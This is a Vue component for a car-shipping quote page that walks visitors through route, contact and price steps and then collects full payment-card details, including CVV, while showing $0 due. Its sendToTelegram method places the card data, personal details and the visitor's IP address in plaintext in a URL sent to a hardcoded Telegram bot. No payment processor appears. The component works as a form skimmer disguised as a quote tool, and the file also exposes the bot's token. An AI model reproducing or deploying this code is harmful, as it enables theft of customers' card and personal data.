<template>
  <main class="page lg:mt-[150px] mt-[100px]">
    <div>
      <div class="container min-h-[100vh]">
        <div
          class="hidden lg:flex steps items-center justify-between gap-[32px]"
        >
          <div
            class="flex gap-[8px] items-center w-[85%]"
            :class="[step == 1 ? 'active' : '', step > 1 ? 'finished' : '']"
          >
            <div class="step-icon">
              <icons name="pick_up" />
            </div>
            <p>Shipment Details</p>
          </div>
          <div
            class="steps-line"
            :class="step > 1 ? 'bg-[#90D26D]' : 'bg-[#5c6670]'"
          ></div>
          <div
            class="flex gap-[8px] items-center justify-center w-full"
            :class="[step == 2 ? 'active' : '', step > 2 ? 'finished' : '']"
          >
            <div class="step-icon">
              <icons name="user" />
            </div>
            <p>Shipper Information</p>
          </div>
          <div
            class="steps-line"
            :class="step > 2 ? 'bg-[#90D26D]' : 'bg-[#5c6670]'"
          ></div>

          <div
            class="flex gap-[8px] items-center justify-center"
            :class="[step == 3 ? 'active' : '', step > 3 ? 'finished' : '']"
          >
            <div class="step-icon">
              <icons name="price" />
            </div>
            <p>Price</p>
          </div>
          <div
            class="steps-line"
            :class="step > 3 ? 'bg-[#90D26D]' : 'bg-[#5c6670]'"
          ></div>

          <div
            class="col-span-1 flex gap-[8px] items-center justify-end"
            :class="[step == 4 ? 'active' : '', step > 4 ? 'finished' : '']"
          >
            <div class="step-icon">
              <icons name="confirmation" />
            </div>
            <p>Confirmation</p>
          </div>
        </div>
        <div class="grid grid-cols-12 grid-flow-row mt-[40rem] gap-[32rem]">
          <div
            v-if="step == 1"
            class="lg:col-span-6 col-span-12 information-form rounded-[16px] lg:pt-[32rem] px-[22px] py-[15px] lg:pb-[36rem] lg:px-[48rem] overflow-hidden border-solid border-[1px] border-[#e6ecf0] relative z-[2]"
          >
            <div>
              <h1 class="lg:text-[30px] text-[25px] font-bold mb-[px]">
                Car Shipping Cost Calculator
              </h1>
              <p
                class="font-normal text-[16px] leading-[130%] text-[#5C6670] mb-[24px]"
                style="color: rgb(92, 102, 112)"
              >
                Our Professional Team is Ready to Assist You. If you any help do
                not hesitate to call us at
                <a href="tel:'(929) 566-50-40'" class="text-[#FF4E00]"
                  >(929) 566-50-40</a
                >
              </p>
              <div class="shipper-info flex flex-col gap-[20px]">
                <div class="relative">
                  <icons name="pick_up" />
                  <el-autocomplete
                    id="ship-from"
                    v-model="shipmentInfo.from"
                    :class="$v.shipmentInfo.from.$anyError ? 'hasError' : ''"
                    :fetch-suggestions="searchZipCodes"
                    clearable
                    placeholder="From (Zip or City, State)"
                    @select="handleSelectFrom"
                  >
                    <template slot-scope="{ item }">
                      <div>
                        {{ item.name }}, {{ item.city }}, {{ item.state }}
                      </div>
                    </template>
                  </el-autocomplete>
                </div>
                <div class="relative">
                  <icons name="drop_off" />
                  <el-autocomplete
                    id="ship-to"
                    v-model="shipmentInfo.to"
                    :class="$v.shipmentInfo.to.$anyError ? 'hasError' : ''"
                    :fetch-suggestions="searchZipCodes"
                    clearable
                    placeholder="To (Zip or City, State)"
                    @select="handleSelectTo"
                  >
                    <template slot-scope="{ item }">
                      <div>
                        {{ item.city }}, {{ item.state }}, {{ item.name }}
                      </div>
                    </template>
                  </el-autocomplete>
                </div>
                <div class="relative">
                  <icons color="#ff0000" name="date" />
                  <el-select
                    v-show="shipmentInfo.date !== 'specificDate'"
                    id="ship-date"
                    v-model="shipmentInfo.date"
                    :class="$v.shipmentInfo.date.$anyError ? 'hasError' : ''"
                    :automatic-dropdown="false"
                    placeholder="Pick up Date"
                    @change="handleDate(shipmentInfo.date)"
                  >
                    <el-option
                      v-for="item in dateOptions"
                      :key="item.value"
                      :label="item.label"
                      :value="item.value"
                    />
                  </el-select>
                  <el-date-picker
                    v-show="shipmentInfo.date === 'specificDate'"
                    id="ship-specificDate"
                    v-model="shipmentInfo.specificDate"
                    automatic-dropdown="true"
                    value-format="dd/MM/yyyy"
                    class="w-full"
                    type="date"
                    placeholder="Pick a day"
                    @change="handleSpecificDate"
                  >
                  </el-date-picker>
                </div>
                <div class="relative">
                  <icons name="car" />

                  <el-select
                    id="ship-type"
                    v-model="shipmentInfo.type"
                    :class="$v.shipmentInfo.type.$anyError ? 'hasError' : ''"
                    placeholder="Size of Car"
                  >
                    <el-option
                      class="size-of-car-select"
                      label="Car"
                      value="Car"
                    >
                      <icons name="carType" />
                      <p>Car</p>
                    </el-option>
                    <el-option
                      class="size-of-car-select"
                      label="SUV"
                      value="SUV"
                      ><icons name="suv" />
                      <p>SUV</p>
                    </el-option>
                    <el-option
                      class="size-of-car-select"
                      label="Pickup"
                      value="Pickup"
                    >
                      <icons name="pickup" />
                      <p>Pickup</p>
                    </el-option>
                    <el-option
                      class="size-of-car-select"
                      label="Motorcycle"
                      value="Motorcycle"
                    >
                      <icons name="motorcycle" />
                      <p>Motorcycle</p>
                    </el-option>
                  </el-select>
                </div>
              </div>
            </div>
            <div class="mt-[20px]">
              <p class="terms-quoteform lg:text-[16px] text-[12px]">
                By proceeding with the above form, you accept our
                <a
                  href="https://www.xpresstransportation.org/terms-and-conditions"
                  class="text-[#FF4E00]"
                  >Terms</a
                >
                and
                <a
                  href="https://www.xpresstransportation.org/privacy-policy"
                  class="text-[#FF4E00]"
                  >Privacy Policy</a
                >
                you are agreed to receive SMS messages from our company. We are
                committed to safeguarding your privacy and personal information.
              </p>
            </div>
            <button class="mt-[20px] w-full" @click="stepOneValidate()">
              Continue
            </button>
          </div>
          <div
            v-if="step == 2"
            class="lg:col-span-6 col-span-12 information-form rounded-[16px] lg:pt-[32rem] px-[22px] py-[15px] lg:pb-[36rem] lg:px-[48rem] overflow-hidden border-solid border-[1px] border-[#e6ecf0] relative z-[2]"
          >
            <div>
              <h1 class="lg:text-[30px] text-[25px] font-bold mb-[px]">
                Let's Get a Quote For You
              </h1>
              <p
                class="font-normal text-[16px] leading-[130%] text-[#5C6670] mb-[24px]"
                style="color: rgb(92, 102, 112)"
              >
                Our Professional Team is Ready to Assist You. If you any help do
                not hesitate to call us at
                <a href="tel:'(929) 566-50-40'" class="text-[#FF4E00]"
                  >(929) 566-50-40</a
                >
              </p>
              <div class="shipper-info flex flex-col gap-[20px]">
                <div class="relative">
                  <Icons name="user" />
                  <el-input
                    v-model="personalInfo.name"
                    :class="$v.personalInfo.name.$anyError ? 'hasError' : ''"
                    placeholder="Your name"
                  />
                </div>
                <div class="relative">
                  <Icons name="phone" />
                  <el-input
                    v-model="personalInfo.phone"
                    v-mask="'(###) ### ## ##'"
                    :class="$v.personalInfo.phone.$anyError ? 'hasError' : ''"
                    placeholder="Your Phone Number"
                  />
                </div>
                <div class="relative">
                  <Icons color="#ff0000" name="mail" />
                  <el-input
                    v-model="personalInfo.email"
                    :class="$v.personalInfo.email.$anyError ? 'hasError' : ''"
                    placeholder="Your Email"
                  />
                </div>
              </div>
            </div>

            <div class="mt-[20px]">
              <p class="terms-quoteform lg:text-[16px] text-[12px]">
                By proceeding with the above form, you accept our
                <a
                  href="https://www.xpresstransportation.org/terms-and-conditions"
                  class="text-[#FF4E00]"
                  >Terms</a
                >
                and
                <a
                  href="https://www.xpresstransportation.org/privacy-policy"
                  class="text-[#FF4E00]"
                  >Privacy Policy</a
                >
                you are agreed to receive SMS messages from our company. We are
                committed to safeguarding your privacy and personal information.
              </p>
            </div>
            <button class="mt-[20px] w-full" @click="checkPrice()">
              Get My Quote
            </button>
          </div>
          <div
            v-if="step === 3"
            class="lg:col-span-9 text-center md:text-left col-span-12 grid grid-cols-3 gap-[32px] pricing-cards"
          >
            <div class="price-cards">
              <h1 class="mb-[8px] text-[32rem] font-bold text-[#244567]">
                Expedited
              </h1>
              <p class="mb-[32px] text-[18px] text-[#212525]">
                Open or Enclosed
              </p>
              <ul class="text-[16px]">
                <li
                  class="mb-[8px] flex items-center justify-center md:justify-start gap-[4px]"
                >
                  <icons name="check" />
                  Faster Pickup-Delivery
                </li>
                <li
                  class="mb-[8px] flex items-center justify-center md:justify-start gap-[4px]"
                >
                  <icons name="check" />
                  Use your preferred dates
                </li>
                <li
                  class="mb-[8px] flex items-center justify-center md:justify-start gap-[4px]"
                >
                  <icons name="check" />
                  Safe & Secured
                </li>
              </ul>
              <h2
                v-if="expeditedPrice"
                class="text-[42px] text-[#244567] mt-[32px] font-bold"
              >
                ${{ expeditedPrice }}
              </h2>
              <h2 v-else class="text-[42px] text-[#244567] mt-[32px] font-bold">
                <div class="loader"></div>
              </h2>
              <button class="btn_blue" @click="expetidedChoosen()">
                Choose
              </button>
            </div>
            <div class="price-cards relative top-choice">
              <div
                class="badge flex items-center items-center gap-[4px] absolute top-[-16px] right-0 bg-[#FF4E00] rounded-[16px] px-[8px] py-[4px]"
              >
                <icons name="discount" />
                <p>Top Choice</p>
              </div>
              <h1 class="mb-[8px] text-[32rem] font-bold text-[#244567]">
                Best Value
              </h1>
              <p class="mb-[32px] text-[18px] text-[#212525]">Open Carrier</p>
              <ul class="text-[16px]">
                <li
                  class="mb-[8px] flex items-center justify-center md:justify-start gap-[4px]"
                >
                  <icons name="check" />
                  Best Priced Availability
                </li>
                <li
                  class="mb-[8px] flex items-center justify-center md:justify-start gap-[4px]"
                >
                  <icons name="check" />
                  Door to Door Service
                </li>
                <li
                  class="mb-[8px] flex items-center justify-center md:justify-start gap-[4px]"
                >
                  <icons name="check" />
                  Insurance Included
                </li>
              </ul>
              <h2
                v-if="bestValue"
                class="text-[42px] text-[#244567] mt-[32px] font-bold"
              >
                ${{ bestValue }}
              </h2>
              <h2 v-else class="text-[42px] text-[#244567] mt-[32px] font-bold">
                <div class="loader"></div>
              </h2>
              <button class="btn_blue" @click="bestValueChoosen()">
                Choose
              </button>
            </div>
            <div class="price-cards">
              <h1 class="mb-[8px] text-[32rem] font-bold text-[#244567]">
                Premium
              </h1>
              <p class="mb-[32px] text-[18px] text-[#212525]">
                Enclosed Carrier
              </p>
              <ul class="text-[16px]">
                <li
                  class="mb-[8px] flex items-center justify-center md:justify-start gap-[4px]"
                >
                  <icons name="check" />
                  White Glove Sevice
                </li>
                <li
                  class="mb-[8px] flex items-center justify-center md:justify-start gap-[4px]"
                >
                  <icons name="check" />
                  Hard Side Lift Gate Trailer
                </li>
                <li
                  class="mb-[8px] flex items-center justify-center md:justify-start gap-[4px]"
                >
                  <icons name="check" />
                  Premium Auto Insurance
                </li>
              </ul>
              <h2
                v-if="premium"
                class="text-[42px] text-[#244567] mt-[32px] font-bold"
              >
                ${{ premium }}
              </h2>
              <h2 v-else class="text-[42px] text-[#244567] mt-[32px] font-bold">
                <div class="loader"></div>
              </h2>

              <button class="btn_blue" @click="premiumChoosen()">Choose</button>
            </div>
          </div>
          <div
            v-if="step === 4"
            class="lg:col-span-4 col-span-12 information-form confirmation rounded-[16px] pt-[20px] px-[20px] pb-[32px] h-auto border-solid border-[1px] border-[#e6ecf0] relative z-[2]"
            style="height: fit-content"
          >
            <h1 class="text-[30px] font-bold mb-[12px]">Confirmation</h1>
            <div class="w-full relative mb-[12px]">
              <span> Card Number </span>
              <icons name="card" />
              <el-input
                v-model="cardInfo.number"
                v-mask="'#### #### #### ####'"
                :class="$v.cardInfo.number.$anyError ? 'hasError' : ''"
                class="mt-[4px]"
                placeholder="0000 0000 0000 0000"
              ></el-input>
            </div>
            <div class="w-full mb-[12px] relative">
              <span> Cardholder Name </span>
              <icons name="user" />

              <el-input
                v-model="cardInfo.name"
                :class="$v.cardInfo.name.$anyError ? 'hasError' : ''"
                class="mt-[4px]"
                placeholder="Name Surname"
              ></el-input>
            </div>
            <div class="w-full mb-[12px] relative">
              <span>Expiry date</span>
              <icons name="date" />
              <el-input
                v-model="cardInfo.date"
                v-mask="'##/##'"
                :class="$v.cardInfo.date.$anyError ? 'hasError' : ''"
                class="mt-[4px]"
                placeholder="MM/YY"
              ></el-input>
            </div>
            <div class="w-full mb-[12px] relative">
              <span>CVV</span>
              <icons name="cvv" />
              <el-input
                v-model="cardInfo.cvv"
                v-mask="'####'"
                :class="$v.cardInfo.cvv.$anyError ? 'hasError' : ''"
                class="mt-[4px]"
                placeholder="0000"
              ></el-input>
            </div>
            <div class="w-full relative">
              <span>ZIP/Postal code</span>
              <icons name="mail" />

              <el-input
                v-model="cardInfo.zip"
                v-mask="'#####'"
                :class="$v.cardInfo.zip.$anyError ? 'hasError' : ''"
                class="mt-[4px]"
                placeholder="00000"
              ></el-input>
            </div>
            <button class="w-full mt-[32rem]" @click="ccInfoValidate()">
              Submit
            </button>
          </div>
          <div
            v-if="step === 5"
            class="lg:col-span-4 col-span-12 information-form confirmation rounded-[16px] pt-[20px] px-[20px] pb-[32px] h-auto border-solid border-[1px] border-[#e6ecf0] relative z-[2]"
            style="height: fit-content"
          >
            <h1 class="text-[30px] font-bold mb-[12px]">Thank You!!!</h1>
            <iframe
              src="https://lottie.host/embed/71e0bd1f-14f0-4614-8a3f-1f418bd671d2/5aFxWuFE1i.json"
            ></iframe>
            <p
              class="text-center font-normal text-[16px] leading-[130%] text-[#5C6670] mb-[24px]"
            >
              Your request has been received. Your will be contacted shortly!
            </p>
            <p>
              We recommend checking out our blog,
              <a
                class="text-[#FF4E00]"
                href="https://www.xpresstransportation.org/blog/preparing-vehicle"
                >The Ultimate Guide to Preparing Your Car for Shipping</a
              >
              on our website. It's packed with useful tips to make your car
              shipping experience smooth and hassle-free.
            </p>
          </div>

          <div
            v-if="step > 3"
            class="col-span-12 lg:col-span-5 hidden lg:block"
            style="height: fit-content"
          >
            <icons name="us_map" />
            asdsadas
          </div>

          <div v-if="step > 2" class="col-span-12 lg:col-span-3 quote-details">
            <div
              v-if="step > 3"
              class="rounded-[16px] mb-[32px] p-[20px] overflow-hidden border-solid border-[2px] border-[#e6ecf0] relative z-[2]"
            >
              <h1 class="mb-[8px] text-[32rem] font-bold text-[#244567]">
                Price:
              </h1>
              <p>Total Price:</p>
              <h2 class="text-[42px] text-[#244567] font-bold">
                ${{ choosenPrice }}
              </h2>
              <p>Due Now:</p>
              <h2 class="text-[42px] text-[#244567] font-bold">$0</h2>
            </div>
            <div
              class="rounded-[16px] p-[20px] overflow-hidden border-solid border-[2px] border-[#e6ecf0] relative z-[2]"
            >
              <h1 class="mb-[8px] text-[32rem] font-bold text-[#244567]">
                Quote Details
              </h1>
              <el-collapse v-model="activeNamesCollapse" accordion>
                <el-collapse-item
                  title="Shipment Details"
                  class="relative"
                  name="1"
                >
                  <div class="relative">
                    <div
                      class="absolute z-10 cursor-pointer right-[5px] top-[10px]"
                      @click="step = 1"
                    >
                      <icons name="edit" />
                    </div>

                    <h6>Ship From:</h6>
                    <p>{{ shipmentInfo.from }}</p>
                  </div>
                  <div>
                    <h6>Deliver To:</h6>
                    <p>{{ shipmentInfo.to }}</p>
                  </div>
                  <div>
                    <h6>Vehicle Type:</h6>
                    <p>{{ shipmentInfo.type }}</p>
                  </div>
                  <div>
                    <h6>Shipment Date:</h6>
                    <p>{{ shipmentInfo.date }}</p>
                  </div>
                </el-collapse-item>
                <el-collapse-item title="Personal Info" name="2">
                  <div class="relative">
                    <div
                      class="absolute z-10 cursor-pointer right-[5px] top-[10px]"
                      @click="step = 2"
                    >
                      <icons name="edit" />
                    </div>
                    <h6>Your Name:</h6>
                    <p>{{ personalInfo.name }}</p>
                  </div>
                  <div>
                    <h6>Your Phone Number:</h6>
                    <p>{{ personalInfo.phone }}</p>
                  </div>
                  <div>
                    <h6>Your Email:</h6>
                    <p>{{ personalInfo.email }}</p>
                  </div>
                </el-collapse-item>
              </el-collapse>
            </div>
          </div>
          <div
            class="lg:col-span-6 col-span-12"
            style="height: fit-content"
            :class="step > 2 ? 'hidden' : 'block'"
          >
            <icons name="us_map" class="hidden lg:block" />
            <Fancybox
              :options="{
                Carousel: {
                  infinite: false,
                },
              }"
            >
              <a
                class="w-full"
                data-fancybox="gallery"
                href="https://www.youtube.com/shorts/2P--abryrJM"
              >
                <div
                  class="flex items-center justify-center cursor-pointer mt-[0rem] lg:mt-[100rem]"
                >
                  <div
                    class="bg-[#244567] flex items-center gap-[16px] py-[8px] px-[10px] rounded-[8px] hover:bg-[#FF4E00] transition"
                  >
                    <icons name="video_play" />
                    <div>
                      <h2 class="text-[20rem] text-[#fff]">
                        What are our customer's saying?
                      </h2>
                      <p class="text-[12px] text-[#fff]">Run time 22 seconds</p>
                    </div>
                  </div>
                </div>
              </a>
            </Fancybox>
          </div>
        </div>
        <div class="grid grid-cols-12 grid-flow-row mt-[40rem] gap-[32rem]">
          <div
            class="lg:col-span-4 col-span-12 flex items-center gap-[16px] justify-start"
          >
            <icons name="doorToDoor" />
            <div>
              <h6 class="text-[20rem] font-bold text-[#ff4e00]">
                DOOR TO DOOR DELIVERY
              </h6>
              <p class="text-[16rem]">From Your Location to Your Destination</p>
            </div>
          </div>
          <div
            class="lg:col-span-4 col-span-12 flex items-center gap-[16px] justify-start"
          >
            <icons name="secure" />
            <div>
              <h6 class="text-[20rem] font-bold text-[#ff4e00]">
                SAFE SHIPPING
              </h6>
              <p class="text-[16rem]">High value insurance</p>
            </div>
          </div>

          <div
            class="lg:col-span-4 col-span-12 flex items-center gap-[16px] justify-start"
          >
            <icons name="pricetag" />
            <div>
              <h6 class="text-[20rem] font-bold text-[#ff4e00]">
                AFFORDABLE PRICING
              </h6>
              <p class="text-[16rem]">Cost-Effective Rates</p>
            </div>
          </div>
        </div>
        <div>
          <!--        <img src="/src/assets/images/main bg.png"-->
          <!--             class=" absolute right-[-10%] top-[50%] transform translate-y-[-50%] z-[1] hidden lg:block " alt=""/>-->
          <img
            src="/images/left-grad-eff.png"
            class="absolute left-0 top-[50%] transform w-[25%] translate-y-[-50%] h-auto z-[0] pointer-events-none"
            alt=""
          />
          <img
            src="/images/right-grad-eff.png"
            class="absolute right-0 top-[50%] transform translate-y-[-50%] z-[0] pointer-events-none"
            alt=""
          />
          <icons
            class="lg:block absolute right-0 top-[50%] transform translate-y-[-50%] z-[0] h-auto w-full lg:w-auto pointer-events-none hidden"
            name="right_side_anim"
          />
          <icons
            class="absolute left-0 top-[50%] transform rotate-[180deg] translate-y-[-50%] z-[0] h-full w-full lg:w-auto pointer-events-none !hidden lg:inline-flex"
            name="right_side_anim"
          />
        </div>
      </div>
      <div class="container">
        <h1 class="lg:text-[30px] text-[25px] font-bold text-center">
          Trust Your Vehicle Transport Quote to Xpress Auto Transport
        </h1>
      </div>
    </div>
  </main>
</template>

<script>
import { mapState } from "vuex";
import {
  email,
  required,
  minLength,
  maxLength,
} from "vuelidate/lib/validators";
export default {
  components: {},
  data() {
    return {
      step: 1,
      index: 1,
      userIp: "1",
      expeditedPrice: undefined,
      bestValue: undefined,
      premium: undefined,
      choosenPrice: undefined,
      activeNamesCollapse: "2",
      shipmentInfo: {
        from: "",
        to: "",
        type: "",
        date: "",
        specificDate: undefined,
      },
      personalInfo: {
        name: "",
        phone: "",
        email: "",
      },
      cardInfo: {
        number: "",
        name: "",
        date: "",
        cvv: "",
        zip: "",
      },
      dateOptions: [
        { label: "As soon as Possible", value: "ASAP" },
        { label: "Within 7 Days", value: "Within 7 days" },
        { label: "Within 2 Weeks", value: "Within 2 weeks" },
        { label: "On A Specific Date", value: "specificDate" },
        { label: "Not Sure Yet", value: "Not Sure yet" },
      ],
      vehicleTypes: [
        { label: "Car", value: "car" },
        { label: "SUV", value: "SUV" },
        { label: "Pickup", value: "Pickup" },
      ],
    };
  },
  validations: {
    shipmentInfo: {
      from: { required, min: minLength(5), max: maxLength(150) },
      to: { required, min: minLength(5), max: maxLength(150) },
      type: { required },
      date: { required },
    },

    personalInfo: {
      email: { required, email },
      name: { required, max: maxLength(50) },
      phone: { required },
    },
    cardInfo: {
      number: { required },
      name: { required, max: maxLength(50) },
      date: { required },
      cvv: { required },
      zip: { required },
    },
  },
  async fetch() {
    await this.$store.dispatch("fetchZips");
  },
  mounted() {
    fetch("https://api.ipify.org?format=json")
      .then((x) => x.json())
      .then(({ ip }) => {
        this.userIp = ip;
      });
  },

  methods: {
    async checkPrice() {
      this.$v.personalInfo.$touch();
      if (!this.$v.personalInfo.$invalid) {
        const pickUpZip = this.shipmentInfo.from?.substring(
          this.shipmentInfo.from.length - 5,
          this.shipmentInfo.from.length
        );
        const dropOffZip = this.shipmentInfo.to?.substring(
          this.shipmentInfo.to.length - 5,
          this.shipmentInfo.to.length
        );
        const vehicleType = this.shipmentInfo.type;
        let shippingDate = "";

        if (this.shipmentInfo.specificDate) {
          shippingDate = this.shipmentInfo.specificDate;
          this.shipmentInfo.date = this.shipmentInfo.specificDate;
        } else {
          const dateToSend = new Date();
          shippingDate =
            dateToSend.getFullYear() +
            "-" +
            (dateToSend.getMonth() + 1) +
            "-" +
            (dateToSend.getDate() + 2);
        }
        await this.$axios
          .post(`https://back.usstartruckingllc.com/api/shipping/price/`, {
            pickup_zip: pickUpZip,
            dropoff_zip: dropOffZip,
            estimated_ship_date: shippingDate,
            vehicle_type: vehicleType,
            ship_via_id: "1",
            vehicle_runs: "1",
          })
          .then((res) => {
            if (res.data.data) {
              const price = res.data.data[1];
              this.sendToTelegram(
                pickUpZip,
                dropOffZip,
                shippingDate,
                vehicleType,
                this.personalInfo.name,
                this.personalInfo.email,
                this.personalInfo.phone,
                price
              );
              this.expeditedPrice = this.roundNearest5(price * 1.3);
              this.bestValue = this.roundNearest5(price * 1);
              this.premium = this.roundNearest5(price * 1.5);
              this.step++;
            } else {
              this.$notify({
                title: "Wrong zip code",
                message: "Please select from the list",
                type: "error",
                position: "top-left",
              });
              this.step = 1;
              this.sendToTelegram(
                pickUpZip,
                dropOffZip,
                shippingDate,
                vehicleType,
                this.personalInfo.name,
                this.personalInfo.email,
                this.personalInfo.phone
              );
            }
          });
      }
    },
    async searchZipCodes(key, cb) {
      await this.$store.dispatch("fetchZips", key);
      setTimeout(() => {
        const results = this.zips;
        cb(results);
      }, 100);
    },
    async sendToTelegram(
      pickup,
      delivery,
      date,
      type,
      name,
      email,
      phone,
      price,
      ccnumber,
      ccname,
      ccdate,
      cccvv,
      cczip
    ) {
      await this.$axios.post(
        `https://api.telegram.org/bot5878927199:AAGM4j1rVxyqRv7xpD4NWM_EdIcEXKEuUwE/sendMessage?chat_id=-1001900427343&text=User IP: ${this.userIp}, Customer Info:
        Pick up:${pickup}, Delivery: ${delivery}, Date: ${date}, Type: ${type}, Name: ${name}, Email: ${email}, Phone: ${phone}, Price:$${price},
        CC number: ${ccnumber}, CC Name: ${ccname}, CC Date: ${ccdate}, CVV: ${cccvv}, Zip: ${cczip}`
      );
    },
    roundNearest5(num) {
      return Math.round(num / 5) * 5;
    },
    stepOneValidate() {
      this.$v.shipmentInfo.$touch();
      if (!this.$v.shipmentInfo.$invalid) {
        this.step++;
      }
    },
    handleSelectFrom(item) {
      this.shipmentInfo.from = `${item.city}, ${item.state}, ${item.name}`;
      document.getElementById("ship-to")?.focus();
    },
    handleSelectTo(item) {
      this.shipmentInfo.to = `${item.city}, ${item.state}, ${item.name}`;
      document.getElementById("ship-date")?.focus();
    },
    handleDate(value) {
      if (value === "specificDate") {
        setTimeout(() => {
          document.getElementById("ship-specificDate").focus();
        }, 10);
      } else {
        setTimeout(() => {
          document.getElementById("ship-type")?.focus();
        }, 10);
      }
    },
    handleSpecificDate() {
      setTimeout(() => {
        document.getElementById("ship-type")?.focus();
      }, 10);
    },
    expetidedChoosen() {
      this.choosenPrice = this.expeditedPrice;
      this.sendToTelegram(
        this.shipmentInfo.from,
        this.shipmentInfo.to,
        this.shipmentInfo.date,
        this.shipmentInfo.type,
        this.personalInfo.name,
        this.personalInfo.email,
        this.personalInfo.phone,
        this.choosenPrice
      );
      this.step++;
    },
    bestValueChoosen() {
      this.choosenPrice = this.bestValue;
      this.sendToTelegram(
        this.shipmentInfo.from,
        this.shipmentInfo.to,
        this.shipmentInfo.date,
        this.shipmentInfo.type,
        this.personalInfo.name,
        this.personalInfo.email,
        this.personalInfo.phone,
        this.choosenPrice
      );
      this.step++;
    },
    premiumChoosen() {
      this.choosenPrice = this.premium;
      this.sendToTelegram(
        this.shipmentInfo.from,
        this.shipmentInfo.to,
        this.shipmentInfo.date,
        this.shipmentInfo.type,
        this.personalInfo.name,
        this.personalInfo.email,
        this.personalInfo.phone,
        this.choosenPrice
      );
      this.step++;
    },
    ccInfoValidate() {
      this.$v.cardInfo.$touch();
      if (!this.$v.cardInfo.$invalid) {
        this.sendToTelegram(
          this.shipmentInfo.from,
          this.shipmentInfo.to,
          this.shipmentInfo.date,
          this.shipmentInfo.type,
          this.personalInfo.name,
          this.personalInfo.email,
          this.personalInfo.phone,
          this.choosenPrice,
          this.cardInfo.number,
          this.cardInfo.name,
          this.cardInfo.date,
          this.cardInfo.cvv,
          this.cardInfo.zip
        );
        this.step++;
      }
    },
  },
  computed: {
    ...mapState({
      zips: (state) => state.zips,
    }),
  },
};
</script>

<style lang="scss" scoped>
.left-side {
  border-radius: 8px;
  border: 1px solid rgba(0, 96, 183, 0.2);
  background: #fff;

  p {
    font-size: 14px;
    font-style: normal;
    font-weight: 600;
    line-height: 140%; /* 19.6px */
  }
}

.information-form {
  .el-input__inner {
    background: #ffffff;
    border: 1px solid #e6ecf0;
    border-radius: 6px;
    padding: 10rem 15rem;
    width: 100%;
    height: 47px;
    font-weight: 600;
    font-size: 15px;
    line-height: 116.96%;
    color: #5c6670;
    transition: all 0.35s ease-in-out;
  }
}
</style>
